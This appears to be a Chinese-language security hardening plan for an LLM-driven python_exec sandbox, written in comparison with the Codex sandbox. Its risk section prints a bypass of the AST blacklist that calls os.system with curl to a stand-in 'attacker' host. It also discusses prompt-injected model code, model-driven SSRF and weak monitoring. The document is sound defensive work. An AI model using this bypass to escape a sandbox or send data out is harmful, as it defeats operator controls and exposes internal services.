# python_exec 沙箱加固方案(参考 Codex 实现)

> 背景:对照 [codex沙箱学习.md](./codex沙箱学习.md) 中提炼的设计原则,评估并加固 react-base-service 的 python_exec 沙箱链路。
> 威胁模型前提:**react-base-service 是多用户服务端**,python 执行的代码由 LLM 生成(可能被数据/prompt 注入影响);Codex 是本地单用户 CLI。**我们的威胁模型更严苛,没有"本地用户兜底审批"这一层**,因此对硬隔离的要求高于 Codex。

---

## 一、现状:执行链路与安全模型

```
WS /react/ws → engine ReAct 循环 → tool_dispatch → meta_tools(executePythonExec)
  → 组装 multi-transport 信封(inline / cos_ref / http_ref)      service/react/python_exec.go:126
  → pythonexec.Execute(HTTP POST,timeout 120s,附 Cookie)         api/pythonexec/client.go:45
  → sandbox/server.py(ThreadingHTTPServer,0.0.0.0:8190)
      ① logId 字符白名单校验
      ② AST 静态扫描(import 白名单 + 危险调用黑名单 + dunder 限制)
      ③ run_isolated:mkdtemp 工作目录 + python -I + 最小 env + setsid
      ④ rlimit:CPU/AS 1G/FSIZE 64M/NPROC 64/CORE 0
      ⑤ 60s 超时 killpg 杀整组;stdout 32M / stderr 256K 截断
  → stdout 剥 artifacts → base64 清洗 → COS 上传落库 → artifactId 回模型
```

容器加固(docker-compose.yml:46-64):非 root 用户、只读根文件系统、tmpfs /tmp 128m、mem_limit 1g、cpus 1.5。

**做得好的部分**(先肯定,这些都和 Codex 的做法同构):logId 白名单校验(≈Codex 的 `-D` 参数注入防御)、最小环境变量(≈Codex 的 env 白名单)、超时杀整进程组(≈kill_on_drop + 进程组)、输出截断防上下文爆炸(≈Codex 输出聚合配额)、只读根文件系统 + 非 root。

## 二、已验证的风险(按严重度)

### R1【P0】AST 黑名单可绕过,且沙箱容器无网络隔离兜底

**实测验证的绕过路径**(在 `python3 -I` 下,`os` 模块依然预加载于 `sys.modules`):

```python
import sys                      # sys 在 import 白名单内
print(sys.modules["os"].system("curl http://attacker/"))   # 全部通过 static_scan
```

- `modules` 不是 dunder 属性,不在 `ALLOWED_DUNDER_ATTRS` 检查范围内;
- `system` 不在 `FORBIDDEN_CALLS` 黑名单内;
- 静态扫描对此放行,子进程内即获得任意代码执行。

**而 docker-compose.yml 中 sandbox 没有任何网络隔离配置**(未定义独立 network、无 `internal: true`),与 mysql/redis/service 同在默认 bridge 网络,且可出外网。**一旦绕过静态扫描,模型(或注入者)即可直接打内网 MySQL/Redis、SSRF 内部服务、外传数据。**

这正是 Codex 哲学的反面教材:Codex **完全不做代码静态扫描**,OS 级 `(deny default)` / seccomp 才是边界。我们现在是"软防线独自承担安全边界,硬隔离缺席"。

### R2【P0】http_ref 输入源 = 预留的模型驱动 SSRF 通道

`service/react/python_exec.go:520-533`:`resolvePythonExecHTTPInput` 把模型给的任意 http(s) URL 仅做格式校验后组成 `http_ref` 信封发给沙箱"自动拉取"。当前 server.py 尚未实现拉取(信封只透传给 stdin),但**协议已开**:未来任何一侧实现该拉取,即成 SSRF;且当前 URL 已能进入沙箱进程的可见数据中。

### R3【P0】用户 Cookie 透传给沙箱

`service/react/python_exec.go:148` 把上游用户 Cookie 原样发给 sandbox(协议里有 `cookies` 字段,server.py 收到但不用)。沙箱完全不需要 Cookie;一旦 http_ref 拉取被实现,Cookie 可能随行外泄;同时 Cookie 会出现在沙箱日志/错误信息的暴露面上。

### R4【P1】fail-open 的资源限制

`sandbox/server.py:130-134`:`resource.setrlimit` 失败被 `except Exception: pass` 吞掉。Codex 的对应做法是任何加固步骤失败即拒绝执行(fail-closed:Landlock `NotEnforced` 报错、capget 断言失败拒绝执行)。我们的 rlimit 一旦设置失败,进程将以无限制状态运行,而日志毫无痕迹。

### R5【P1】无并发治理

- server.py `ThreadingHTTPServer` 每请求一线程 + 每请求一个子进程,无全局并发/速率上限;
- Go 侧 timeout 120s > 沙箱 60s,窗口内可堆积;`retry:1` 使失败请求还会再打一次;
- 单容器 1.5 CPU / 1G 内存被所有 caller 共享,无 per-caller 配额,存在"DoS 邻居"与排队饥饿问题。

### R6【P1】沙箱本体零测试

server.py 没有任何测试。AST 扫描这类"黑名单必须持续正确"的逻辑,恰恰最需要"已知绕过尝试必须被拒绝"的回归集。Codex 的 seatbelt 测试(116KB)就是真实执行断言被拒的行为测试。

### R7【P2,沙箱外但更紧急】免鉴权与凭证问题

与本主题相关但属服务边界:`middleware/auth.go` 信任 `X-User-Name` 头可伪造;`conf/mount/custom.yaml` 提交了真实 mcpgw 凭证;mcpadmin 空配置时 fail-open。这些不属于沙箱,但决定了"谁能触发沙箱",在此一并登记。

## 三、优化方案

### P0-1 沙箱网络硬隔离(最高优先级,改造成本最低收益最大)

**Codex 原则映射**:默认全拒 + 纵深防御——静态扫描降级为"减少噪声的第一层",OS/网络层才是边界。

**落地**(docker-compose.yml):

```yaml
networks:
  backend:        # mysql/redis/service 之间
  sandbox-net:
    internal: true   # 无出网路由,不可达外网

services:
  sandbox:
    networks: [sandbox-net]        # 只在隔离网络——mysql/redis 不可达、外网不可达
    # 删除 ports 映射(internal 网络不支持宿主端口映射)
  service:
    networks: [backend, sandbox-net]   # service 桥接两网,仍可调 sandbox:8190
  mysql:
    networks: [backend]
  redis:
    networks: [backend]
```

要点:
- sandbox 的 healthcheck 用 `127.0.0.1:8190` 自检,不受影响;
- 本地开发(`go run` 直连 `127.0.0.1:18190`)改为 `docker compose exec` / 端口发布 profile,或本地直接 `python sandbox/server.py` 裸跑(本机开发本就非多租户威胁面);
- K8s 部署时对应做法:sandbox Pod 出 `NetworkPolicy` 默认 deny egress + 仅允许来自 service 的 ingress;
- **加一个验证手段**:部署后跑一次 R1 的绕过 PoC,断言 `curl`/内网连接失败——把"隔离生效"变成可回归的检查。

### P0-2 关闭或收敛 http_ref

推荐二选一(按业务需要):
- **A(简单彻底)**:删除 `pythonExecInputSourceHTTP` 输入源与 `resolvePythonExecHTTPInput`,模型描述同步更新;需要外部数据的场景走已有 attachment/cos_ref 通道(后端拉取、有归属校验)。
- **B(保留能力)**:改为**后端预拉取**——Go 侧下载 URL 内容(带 SSRF 校验:拒绝私网/环回字面量 + 解析后 IP 校验防 DNS rebinding + 响应大小上限),以 inline 方式喂给沙箱;沙箱侧永远不发起网络请求。这与 Codex 的 managed proxy 思路一致:**出口收敛到一个受控组件,而不是让最不可信的环境(沙箱)自己拉数据**。

无论 A/B,server.py 协议层面应显式忽略/拒绝 `http_ref` kind,不留给未来实现者"顺手支持"的空间。

### P0-3 移除 Cookie 透传

- 删除 `python_exec.go:148` 的 `Cookies` 字段与 `api/pythonexec/client.go` 的 Cookie 请求头;沙箱协议里的 `cookies` 字段标记 deprecated 并在 server.py 显式忽略;
- 业务 HTTP 工具的 Cookie 透传(`service/tool/executor.go`)单独评估:注册 URL 白名单制 + 按工具配置是否携带凭证(最小权限),不在本次沙箱范围展开。

### P1-1 fail-closed 改造(server.py)

```python
def _apply_limits() -> None:   # preexec_fn 中失败只能 os._exit,不能静默
    ...
    for which, value in limits:
        try:
            resource.setrlimit(which, value)
        except Exception as exc:
            os.write(2, f"sandbox: setrlimit {which} failed: {exc}\n".encode())
            os._exit(99)       # 拒绝执行,而不是无限制运行
```

配套:
- `resource is None`(Windows/非 Unix)时,`run_isolated` 直接返回 `sandbox spawn failed: rlimit unsupported`——不支持就拒绝,不降级;
- `static_scan` 中 `ast.parse` 的 except 保持拒绝(已正确);补一条:扫描器自身抛出的任何未预期异常也应按拒绝处理(把 `static_scan` 调用包进 `except Exception → reject`,扫描器崩溃不能 fail-open)。

### P1-2 AST 扫描补强(提高绕过成本,但不作为安全边界)

在 P0-1 落地的前提下,静态扫描的价值变成"快速反馈 + 降低噪声"。针对性补丁:

1. **属性级精准白名单**:`sys` 仅允许 `stdin/stdout/stderr/argv`(读信封需要 stdin);显式拒绝 `sys.modules`、`sys.path`、`sys._getframe`、`sys.builtin_module_names` 等逃逸入口;
2. **禁子模块钻营**:白名单校验改校验完整模块路径第一段的同时,拒绝 `pandas.io.sas` 等已知含惰性危险能力的子路径(出现一个封一个,黑名单兜底用);
3. **禁动态导入面**:已禁 `__import__`/`eval`/`exec`/`getattr`,补充禁 `importlib`(不在白名单已天然覆盖)、`builtins`(同前)、以及任何对 `__loader__`/`__spec__` 的访问(dunder 检查已覆盖,确认即可);
4. **把 R1 的 PoC 写进回归测试**(见 P1-4)。

### P1-3 并发治理与资源公平

- server.py:进程内 `threading.Semaphore(SANDBOX_MAX_CONCURRENT, 默认 2~4)`,超限快速返回 `busy`(带 Retry-After 语义),防止容器内存被排队线程+子进程吃满;
- Go 侧:`executePythonExec` 加 caller 级限流(与工具并发上限共用 `ConcurrentSafe=false` 语义,当前已是串行,确认不被并行路径绕过);`retry:1` 对 python_exec 关闭(代码执行是幂等性未知的重活,失败让模型自己决定重写代码);
- 指标:增加 `sandbox_busy_total`、排队等待时长打点,与现有 `PythonExecTimeoutsTotal` 并列。

### P1-4 沙箱测试补齐

- 为 server.py 建 pytest(`sandbox/tests/`):
  - **拒绝回归集**:R1 PoC(`sys.modules['os']`)、相对导入、dunder 访问、forbidden 调用、logId 非法字符——每个已知绕过一个用例,新绕过第一时间进集;
  - **行为集**:超时 killpg 生效、rlimit 实际生效(子进程内 `resource.getrlimit` 断言)、stdout/stderr 截断、8MB body 上限、并发信号量;
  - **隔离集**(依赖 P0-1):沙箱内尝试 `socket.create_connection` 到内网地址,断言失败——对应 Codex "真实执行并断言被拒" 的测试哲学;
- 接入 CI(现有 `ci.yml` Build+Vet+Test 加一个 job 跑 sandbox 测试)。

### P2-1 策略即数据(借鉴 PermissionProfile)

把沙箱安全参数从环境变量散置(SANDBOX_TIMEOUT_SEC/MEM_LIMIT_MB/…)收敛为一个 **profile JSON**,由 Go 侧按 caller/run 类型下发,server.py 按 profile 执行并回显指纹:

```json
{
  "profile": "default",
  "timeout_sec": 60, "mem_mb": 1024, "max_concurrent": 2,
  "stdout_mb": 32, "import_roots": ["sys", "json", "pandas", "numpy", "matplotlib", "..."],
  "network": "denied"
}
```

价值:不同 caller 差异化限额、策略可 diff 可审计、响应里带 profile 指纹便于排障——对应 Codex `--permission-profile <JSON>` + `sandbox-summary` 的做法。

### P2-2 python_exec 纳入审批流(借鉴 AskForApproval 闭环)

现状:python_exec 是 meta tool,不走 `tool_confirm`(该门只拦 http/mcp 工具)。Codex 的模式是"沙箱内尝试失败 → 识别拒绝 → 审批 → 提权"。我们可复用该交互做**反向审批**:
- 默认 `auto` 执行(保持体验);
- 高敏 caller/run 类型(如 reflection、外部租户)配 `confirm_risky`,风险正则命中(`requests`/`urllib` 字样、超大输入、长代码)时走既有 `tool_confirm_request` WS 确认流;
- `resolveEffectiveToolPermission` 的"agent 级只能收紧"原则保持不变;顺手修复 `tool_confirm.go:77-85` 的未知模式 fail-open → fail-closed。

### P2-3 拒绝识别与可观测性(借鉴 denial.rs / violation.rs)

- server.py 返回的 `stderr` 中区分:`static_rejected / limit_hit / timed_out / runtime_error` 四类 `denyReason` 字段(现在只能靠 stderr 文本猜);
- Go 侧按 `denyReason` 分别打点 `sandbox_static_rejected_total / sandbox_limit_total / sandbox_timeout_total`,模型提示词可针对 static_rejected 给出白名单引导(当前已有,保持);
- 对应 Codex `sandbox_tags` 的教训:这些标签只用于诊断/遥测,**不得**参与任何鉴权判断。

### P2-4 架构演进(中期)

单容器 fork 模型在"多租户 + 不可信代码"下的天花板:内核攻击面共享、逃逸即全容器沦陷、故障爆炸半径大。演进路径按成本递增:
1. **当前模型 + 网络隔离**(P0-1)已覆盖主要风险;
2. **gVisor(runsc) runtime**:compose/K8s 给 sandbox 容器换 runtime,拦截系统调用层,内核攻击面大幅收窄,改造成本低(一行 runtime 配置);
3. **每请求容器 / 容器池**:K8s Job 或预热容器池(对照 Codex "每次全新生成 argv、不池化"的简单性取舍:我们多租户下隔离优先级高于延迟);
4. Firecracker/microVM:仅当出现真正不可信租户时再考虑。

## 四、落地路线图

| 阶段 | 内容 | 改动面 |
|---|---|---|
| 第一周 | P0-1 网络隔离 + 部署后 PoC 验证;P0-2 http_ref 处置;P0-3 移除 Cookie | compose/python_exec.go/client.go,不动 server.py 协议主体 |
| 第二周 | P1-1 fail-closed;P1-2 AST 补强;P1-4 测试补齐(含回归集) | server.py + 新增 tests |
| 第三周 | P1-3 并发治理;P2-3 denyReason 分类打点 | server.py + metrics |
| 第四周起 | P2-1 profile 化;P2-2 审批接入;评估 gVisor | 按业务节奏 |

R7(鉴权/凭证)建议独立排期,**优先级不低于本方案**——它决定"谁能把代码送进沙箱"。

## 五、不建议照搬 Codex 的部分

1. **不照搬"无静态扫描"**:Codex 面向本地开发者(用户可看屏幕、可审批),我们面向服务端多租户;AST 扫描虽软,但成本低、能拦住"模型误用"这类高频低危行为,保留为第一层。
2. **不照搬"审批后提权到无沙箱重跑"**:服务端没有可信人工审批者;我们的对应物是 P2-2 的反向审批(高危先确认),而非提权。
3. **不引入 shell 常驻 + 逐 exec 提权**(shell-escalation):我们的执行粒度是整段脚本,不存在"shell 内单条 exec 升级"的需求。
4. **暂不需要 RLIMIT_NPROC 之外的 pid namespace 级治理**:Codex 用 pid namespace 治理进程;我们容器内单请求子进程 + killpg 已够,容器本身已是进程边界。
